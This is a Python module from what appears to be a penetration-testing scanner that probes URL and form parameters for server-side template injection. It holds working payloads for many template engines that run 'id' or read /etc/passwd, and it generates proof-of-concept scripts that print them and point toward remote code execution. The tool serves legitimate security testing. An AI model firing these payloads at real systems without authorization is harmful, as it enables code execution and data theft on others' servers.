"""
Active vulnerability scanner for SSTI (Server-Side Template Injection).
"""

import asyncio
import uuid
from typing import Dict, List, Optional, Set, Any
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
import logging

from pentest_scanner.utils.http_client import HTTPClient, ResponseWrapper
from pentest_scanner.utils.models import (
    Vulnerability, Severity, VulnerabilityCategory, CVSSScore,
    Evidence, ScanResult, HTTPRequest, HTTPResponse
)
from pentest_scanner.config.settings import (
    SSTI_PAYLOADS, SEVERITY_CVSS_MAP
)

logger = logging.getLogger(__name__)


class SSTIScanner:
    """Server-Side Template Injection vulnerability scanner."""
    
    def __init__(self, client: HTTPClient, config, scan_result: ScanResult):
        self.client = client
        self.config = config
        self.scan_result = scan_result
        self.tested_parameters: Set[str] = set()
        
        # Template engine specific payloads and detection patterns
        self.engine_payloads = {
            "jinja2": [
                "{{7*7}}",
                "{{7*'7'}}",
                "{{config}}",
                "{{self}}",
                "{{request}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                "{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}",
            ],
            "twig": [
                "{{7*7}}",
                "{{7*'7'}}",
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
                "{{['id']|filter('system')}}",
            ],
            "freemarker": [
                "${7*7}",
                "${'freemarker.template.utility.Execute'?new()('id')}",
                "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
            ],
            "velocity": [
                "#set($x=7*7)${x}",
                "#set($rt=$class.forName('java.lang.Runtime'))#set($proc=$rt.getRuntime().exec('id'))${proc}",
            ],
            "smarty": [
                "{7*7}",
                "{php}echo `id`;{/php}",
                "{system('id')}",
            ],
            "erb": [
                "<%= 7*7 %>",
                "<%= `id` %>",
                "<%= IO.popen('id').readlines() %>",
            ],
            "jsp": [
                "${7*7}",
                "<%= 7*7 %>",
                "<% Runtime.getRuntime().exec('id'); %>",
            ],
            "thymeleaf": [
                "${7*7}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
            ],
            "generic": [
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "@{7*7}",
                "<%= 7*7 %>",
            ]
        }
        
        self.engine_detection = {
            "jinja2": ["jinja", "werkzeug", "flask"],
            "twig": ["twig", "symfony"],
            "freemarker": ["freemarker", "ftl"],
            "velocity": ["velocity", "vtl"],
            "smarty": ["smarty"],
            "erb": ["erb", "rails"],
            "jsp": ["jsp", "java", "tomcat", "jetty"],
            "thymeleaf": ["thymeleaf", "spring"],
        }
    
    async def run(self, endpoints: List) -> Dict[str, Any]:
        """Run SSTI scans on discovered endpoints."""
        results = {
            "vulnerabilities_found": 0,
            "parameters_tested": 0,
            "ssti_findings": [],
        }
        
        for endpoint in endpoints:
            if hasattr(endpoint, 'url'):
                url = endpoint.url
            else:
                url = endpoint.get('url', '')
            
            if not url:
                continue
            
            # Test URL parameters
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param_name, param_values in params.items():
                if param_name in self.tested_parameters:
                    continue
                self.tested_parameters.add(param_name)
                results["parameters_tested"] += 1
                
                # Test SSTI payloads
                for payload in SSTI_PAYLOADS[:10]:
                    vuln = await self._test_ssti(url, param_name, payload)
                    if vuln:
                        results["vulnerabilities_found"] += 1
                        results["ssti_findings"].append(vuln.to_dict())
                        break
            
            # Test form parameters
            if hasattr(endpoint, 'forms') and endpoint.forms:
                for form in endpoint.forms:
                    await self._test_form_ssti(url, form, results)
        
        return results
    
    async def _test_ssti(self, url: str, param_name: str, payload: str) -> Optional[Vulnerability]:
        """Test for SSTI in a URL parameter."""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[param_name] = [payload]
            new_query = urlencode(params, doseq=True)
            test_url = parsed._replace(query=new_query).geturl()
            
            response = await self.client.get(test_url)
            wrapper = ResponseWrapper(response)
            body = await wrapper.text()
            
            # Check for SSTI indicators
            ssti_result = self._check_ssti_indicators(body, payload)
            
            if ssti_result:
                engine, indicator = ssti_result
                
                vuln = Vulnerability(
                    id=f"SSTI_{uuid.uuid4().hex[:8].upper()}",
                    title=f"Server-Side Template Injection (SSTI) in parameter '{param_name}'",
                    description=f"Parameter '{param_name}' is vulnerable to SSTI. The application uses user input directly in template rendering, allowing code execution. Detected engine: {engine}",
                    category=VulnerabilityCategory.SSTI,
                    severity=Severity.CRITICAL,
                    cvss=CVSSScore(**SEVERITY_CVSS_MAP["critical"]),
                    owasp_category="A03:2021 – Injection",
                    url=test_url,
                    parameter=param_name,
                    method="GET",
                    poc=f"SSTI Payload: {payload} -> Output: {indicator}",
                    poc_code=self._generate_ssti_poc(test_url, param_name, payload, engine),
                    remediation="Use sandboxed template engines. Avoid user input in templates. Implement strict input validation. Use logic-less templates (Mustache, Handlebars).",
                    references=[
                        "https://owasp.org/www-project-top-ten/2021/A03_2021-Injection",
                        "https://portswigger.net/web-security/server-side-template-injection",
                        "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
                    ],
                    tags=["active", "ssti", "rce", "injection"],
                    confirmed=True
                )
                
                vuln.evidence.append(Evidence(
                    type="response",
                    description=f"SSTI confirmed - template engine: {engine}",
                    data={"payload": payload, "engine": engine, "indicator": indicator}
                ))
                vuln.request = HTTPRequest(method="GET", url=test_url)
                vuln.response = HTTPResponse(
                    status_code=response.status,
                    headers=dict(response.headers),
                    body=body[:2000],
                    url=test_url
                )
                
                self.scan_result.add_vulnerability(vuln)
                return vuln
                
        except Exception as e:
            logger.debug(f"Error testing SSTI on {url} param {param_name}: {e}")
        
        return None
    
    def _check_ssti_indicators(self, body: str, payload: str) -> Optional[tuple]:
        """Check response for indicators of successful SSTI."""
        # Mathematical evaluation
        if "49" in body and ("7*7" in payload or "7*7" in payload.replace("*", "")):
            # Determine engine based on payload syntax
            if payload.startswith("{{") and payload.endswith("}}"):
                return ("jinja2/twig", "Mathematical expression evaluated: 7*7=49")
            elif payload.startswith("${") and payload.endswith("}"):
                return ("freemarker/velocity/thymeleaf/jsp", "Mathematical expression evaluated: 7*7=49")
            elif payload.startswith("#{") and payload.endswith("}"):
                return ("ruby/erb", "Mathematical expression evaluated: 7*7=49")
            elif payload.startswith("<%=") and payload.endswith("%>"):
                return ("erb/jsp", "Mathematical expression evaluated: 7*7=49")
            elif payload.startswith("@{") and payload.endswith("}"):
                return ("razor", "Mathematical expression evaluated: 7*7=49")
            return ("generic", "Mathematical expression evaluated: 7*7=49")
        
        # String multiplication (Jinja2/Twig specific)
        if "7777777" in body and "7*'7'" in payload:
            return ("jinja2/twig", "String multiplication executed: '7'*7")
        
        # Configuration/object exposure
        if any(kw in body.lower() for kw in ["config", "debug", "secret", "database_uri", "sqlalchemy"]):
            if "{{config}}" in payload or "{{self}}" in payload:
                return ("jinja2", "Configuration object exposed")
        
        # Class/method exposure
        if "__class__" in body or "__mro__" in body or "__subclasses__" in body:
            return ("jinja2", "Python introspection successful - RCE possible")
        
        # Command execution indicators
        if any(kw in body for kw in ["uid=", "gid=", "groups=", "root:", "daemon:"]):
            return ("multiple", "Command execution successful - RCE confirmed")
        
        # Error messages indicating template engine
        error_patterns = {
            "jinja2": ["jinja2.exceptions", "undefinederror", "templateyntaxerror", "templatesyntaxerror"],
            "twig": ["twig\\.error", "syntaxerror", "twigerror"],
            "freemarker": ["freemarker", "templateexception", "parseexception"],
            "velocity": ["velocity", "parseerrorexception", "methodexception"],
            "smarty": ["smarty", "smartyexception", "syntaxerror"],
            "erb": ["actionview::template::error", "syntaxerror"],
            "jsp": ["jasper", "jsp", "servlet", "java.lang"],
            "thymeleaf": ["thymeleaf", "templateprocessingexception"],
        }
        
        body_lower = body.lower()
        for engine, patterns in error_patterns.items():
            if any(p in body_lower for p in patterns):
                return (engine, f"Template engine error detected: {engine}")
        
        return None
    
    async def _test_form_ssti(self, url: str, form: Dict, results: Dict):
        """Test SSTI in form inputs."""
        action = form.get('action', '')
        method = form.get('method', 'GET').upper()
        inputs = form.get('inputs', [])
        
        if not action:
            action = url
        elif not action.startswith('http'):
            action = urljoin(url, action)
        
        for input_field in inputs:
            input_name = input_field.get('name', '')
            input_type = input_field.get('type', 'text')
            
            if not input_name or input_type in ['submit', 'button', 'image', 'hidden', 'token', 'csrf']:
                continue
            
            if input_name in self.tested_parameters:
                continue
            self.tested_parameters.add(input_name)
            results["parameters_tested"] += 1
            
            for payload in SSTI_PAYLOADS[:5]:
                vuln = await self._test_form_input_ssti(action, method, input_name, payload, inputs)
                if vuln:
                    results["vulnerabilities_found"] += 1
                    results["ssti_findings"].append(vuln.to_dict())
                    break
    
    async def _test_form_input_ssti(self, action: str, method: str, input_name: str, payload: str, all_inputs: List) -> Optional[Vulnerability]:
        """Test SSTI in a specific form input."""
        try:
            form_data = {}
            for inp in all_inputs:
                name = inp.get('name', '')
                if name == input_name:
                    form_data[name] = payload
                elif inp.get('type') not in ['submit', 'button', 'image']:
                    form_data[name] = inp.get('value', 'test')
            
            if method == "POST":
                response = await self.client.post(action, data=form_data)
            else:
                response = await self.client.get(action, params=form_data)
            
            wrapper = ResponseWrapper(response)
            body = await wrapper.text()
            
            ssti_result = self._check_ssti_indicators(body, payload)
            
            if ssti_result:
                engine, indicator = ssti_result
                
                vuln = Vulnerability(
                    id=f"SSTI_FORM_{uuid.uuid4().hex[:8].upper()}",
                    title=f"SSTI in form input '{input_name}'",
                    description=f"Form input '{input_name}' is vulnerable to SSTI via {method} request. Detected engine: {engine}",
                    category=VulnerabilityCategory.SSTI,
                    severity=Severity.CRITICAL,
                    cvss=CVSSScore(**SEVERITY_CVSS_MAP["critical"]),
                    owasp_category="A03:2021 – Injection",
                    url=action,
                    parameter=input_name,
                    method=method,
                    poc=f"Submit form to {action} with {input_name}={payload}",
                    poc_code=self._generate_form_ssti_poc(action, method, input_name, payload, form_data, engine),
                    remediation="Use sandboxed template engines. Avoid user input in templates. Implement strict input validation.",
                    references=[
                        "https://portswigger.net/web-security/server-side-template-injection",
                        "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
                    ],
                    tags=["active", "ssti", "form", "rce", "injection"],
                    confirmed=True
                )
                
                vuln.evidence.append(Evidence(
                    type="response",
                    description=f"SSTI confirmed in form - engine: {engine}",
                    data={"payload": payload, "input": input_name, "engine": engine, "indicator": indicator}
                ))
                vuln.request = HTTPRequest(method=method, url=action, body=str(form_data))
                vuln.response = HTTPResponse(
                    status_code=response.status,
                    headers=dict(response.headers),
                    body=body[:2000],
                    url=str(response.url)
                )
                
                self.scan_result.add_vulnerability(vuln)
                return vuln
                
        except Exception as e:
            logger.debug(f"Error testing form SSTI: {e}")
        
        return None
    
    def _generate_ssti_poc(self, url: str, param: str, payload: str, engine: str) -> str:
        """Generate proof of concept code for SSTI."""
        base_url = url.split('?')[0]
        return f"""#!/usr/bin/env python3
\"\"\"
Proof of Concept for Server-Side Template Injection (SSTI)
Target: {url}
Parameter: {param}
Detected Engine: {engine}
\"\"\"

import requests
from urllib.parse import urlencode

# Target URL
base_url = "{base_url}"
param_name = "{param}"

# SSTI payloads for different engines
payloads = {{
    "jinja2": [
        "{{{{7*7}}}}",
        "{{{{7*'7}}}}",
        "{{{{config}}}}",
        "{{{{''.__class__.__mro__[2].__subclasses__()}}}}",
        "{{{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}}}",
    ],
    "twig": [
        "{{{{7*7}}}}",
        "{{{{_self.env.registerUndefinedFilterCallback('exec')}}}}{{{{_self.env.getFilter('id')}}}}",
    ],
    "freemarker": [
        "${{{{7*7}}}}",
        "${{{{'freemarker.template.utility.Execute'?new()('id')}}}}",
    ],
    "velocity": [
        "#set($x=7*7)${{{{x}}}}",
    ],
    "erb": [
        "<%= 7*7 %>",
        "<%= `id` %>",
    ],
    "generic": [
        "{{{{7*7}}}}",
        "${{{{7*7}}}}",
        "#{{{{7*7}}}}",
        "@{{{{7*7}}}}",
        "<%= 7*7 %>",
    ]
}}

print(f"[+] Testing SSTI on {{base_url}} (Engine: {engine})")

# Test engine-specific payloads
engine_payloads = payloads.get("{engine.lower()}", payloads["generic"])

for i, payload in enumerate(engine_payloads, 1):
    print(f"\\n[+] Payload {{i}}: {{payload}}")
    
    params = {{param_name: payload}}
    test_url = f"{{base_url}}?{{urlencode(params)}}"
    
    try:
        response = requests.get(test_url, timeout=10)
        print(f"    Status: {{response.status_code}}")
        print(f"    Length: {{len(response.text)}}")
        
        if "49" in response.text:
            print("    [+] Mathematical expression evaluated!")
        if "7777777" in response.text:
            print("    [+] String multiplication executed!")
        if "uid=" in response.text or "root:" in response.text:
            print("    [!!!] RCE CONFIRMED!")
        if "config" in response.text.lower() or "secret" in response.text.lower():
            print("    [!!!] CONFIG/SECRETS EXPOSED!")
            
    except Exception as e:
        print(f"    Error: {{e}}")

print(f"\\n[+] Original vulnerable URL: {url}")
print(f"[+] For RCE, try payloads that access __subclasses__ or Runtime.exec()")
"""
    
    def _generate_form_ssti_poc(self, action: str, method: str, input_name: str, payload: str, form_data: Dict, engine: str) -> str:
        """Generate PoC for form-based SSTI."""
        return f"""#!/usr/bin/env python3
\"\"\"
Proof of Concept for Form-based SSTI
Target: {action}
Method: {method}
Parameter: {input_name}
Detected Engine: {engine}
\"\"\"

import requests

# Target URL
target_url = "{action}"
method = "{method}"

# Form data with SSTI payload
form_data = {form_data}
form_data["{input_name}"] = "{payload}"

print(f"[+] Testing SSTI via form submission to {{target_url}}")

try:
    if method == "POST":
        response = requests.post(target_url, data=form_data, timeout=10)
    else:
        response = requests.get(target_url, params=form_data, timeout=10)
    
    print(f"    Status: {{response.status_code}}")
    print(f"    Length: {{len(response.text)}}")
    
    if "49" in response.text:
        print("    [+] Mathematical expression evaluated!")
    if "7777777" in response.text:
        print("    [+] String multiplication executed!")
    if "uid=" in response.text or "root:" in response.text:
        print("    [!!!] RCE CONFIRMED!")

except Exception as e:
    print(f"    Error: {{e}}")

print(f"\\n[+] Manual test: Submit form to {{target_url}} with {input_name}={payload}")
"""